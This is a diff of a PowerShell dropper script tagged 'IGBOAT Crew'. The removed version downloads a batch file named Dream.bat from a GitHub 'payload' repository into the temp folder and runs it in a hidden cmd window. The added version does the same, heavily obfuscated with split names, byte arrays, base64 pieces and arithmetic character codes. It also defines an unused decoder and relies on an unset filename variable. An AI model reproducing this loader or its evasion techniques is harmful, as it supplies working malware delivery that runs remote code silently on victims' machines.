@@ -1,9 +1,5 @@
-$a = "https://raw.githubusercontent.com/baledreamer/payload/refs/heads/main/Dream.bat"
-# IGBOAT Crew
-$y = "$env:temp\\xxxxx.bat"
-$sleepTheGodFilePath = Join-Path $env:LocalAppData "Temp\\SleepTheGod"
-if (-not (Test-Path $sleepTheGodFilePath)) {
-    New-Item -ItemType File -Path $sleepTheGodFilePath -Force | Out-Null
-    Invoke-WebRequest -Uri $a -OutFile $y -ErrorAction SilentlyContinue | Out-Null
-    Start-Process "cmd" "/c $y" -WindowStyle Hidden
-}
+function r`Od8`Qrk`B`Vis {param ([string] $kdotwhfvgWtvxz);${kdotgJxhpkqagW} = [cONverT]::"f`R`Omba`Se64`St`R`I`Ng"($kdotwhfvGwtvxz);${`Kd`O`Tnls`O`Xu`Xlkg} = [sYsTEM.io.meMoRYStreAM]::"`New"(${kdotgJxhpkqagw});${kdo`T`Ij`F`G`O`Fg`Cnp} = [SysTEm.IO.cOMPReSsiON.gzipsTREAM]::"`N`Ew"(${`Kd`O`Tnl`So`X`U`Xl`Kg}, [sySteM.io.CoMPreSSiON.COMprESsIONmode]::"`D`E`Co`M`Pre`S`S");${`Kd`Oti`J`F`Go`Fg`C`Np} = [System.Io.cOmpresSion.gZiPSTrEAm]::"`N`Ew"([systEm.io.mEMoRysTREAm]::"new"(${kdotgJxhpkqaGW}), [SYSTEm.io.cOmpReSSIOn.CoMPresSiONmOde]::"d`E`Comp`R`E`S`S");${`Kdo`T`I`Jsguhbf`Xs} = [sYsTeM.iO.sTREAmReadER]::"`N`Ew"(${kdo`Tij`Fgofg`Cnp});${KDotcsaFajuKyt} = ${`K`Do`T`I`Js`G`Uh`B`F`X`S}."r`E`Adt`O`End"();return ${KDotcsafajuKyt}}
+${`Kdo`Tk`Iydy`S`Rrbl} = ((([sYsTEm.tExt.ENCODiNG]::"u`Tf8"."`G`E`Tst`R`In`G"([byte[]](104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,98,97,108,101,100,114,101,97,109,101,114,47,112,97)))+([SYstEM.Text.EncOdinG]::"utf8"."`G`E`Tstring"([SySTEm.CONveRt]::"`Fr`Om`B`Ase64s`T`R`I`Ng"('eWxvYWQvcmVmcy9oZWFkcy9tYWluL0RyZWFtLg==')))+([sySTEm.TEXT.eNcODING]::"ut`F8"."`G`E`Tstr`I`N`G"([SysTEm.coNVeRt]::"`Fr`O`M`B`As`E64`Stri`N`G"('YmF0')))))
+${`K`Do`Th`Myd`Nprt`F`R} = (([sTRINg]::EmpTy) + $env:temp + ((([SYsTem.tEXt.eNCODIng]::"ut`F8"."`G`Et`Stri`Ng"([byte[]](0x5c,92))))) + ${kd`O`T`Qhpj`C`Ud`A`Hv} + ((([System.TeXt.encoDING]::"ut`F8"."ge`Tstr`In`G"([SYSTem.ConVErt]::"fr`Omb`Ase64`Str`Ing"('LmJhdA=='))))))
+.(-join[char[]]((6483-6410),(-883+993),(-795+913),(-9100+9211),(-8516+8623),(-3354+8307-4852),(-1703+1748),(3417-3330),(-2054+2155),(-5914+6012),(-4735+4817),(7619-7518),(-10219+9379+953),(-883+1000),(-5229+5330),(2872-2757),(9575-9459))) -Uri ${`Kdot`K`Iy`Dysrrb`L} -OutFile ${kd`Othm`Y`D`Np`Rt`F`R} -ErrorAction SilentlyContinue | .(-join[char[]]((-10390+7216+3253),(8454-8337),(-5710+8138-2312),(-8462+8507),(5653-5575),(7656-341-7198),(-7184+7292),(-5218+3887+1439)))
+.(-join[char[]]((3490-3407),(-4526+3176+1466),(-2018+2115),(-2261+2375),(5896-5780),(-3312+3357),(-2040+2120),(7107-4569-2424),(-5443+1277+4277),(8815-8716),(-868+969),(-6242+6357),(5290-5175))) ((([SySTeM.TExt.EnCOdIng]::"`U`T`F8"."`G`E`T`String"([byte[]](99,109,100))))) (((([SYSteM.tEXt.eNCoDInG]::"`Ut`F8"."`Ge`T`S`Trin`G"([SYStEm.cOnVERT]::"fromb`As`E64str`I`Ng"('L2Mg'))))) + ${k`Doth`M`Y`Dnp`R`Tf`R} + ([sTRING]::empTy)) -WindowStyle Hidden
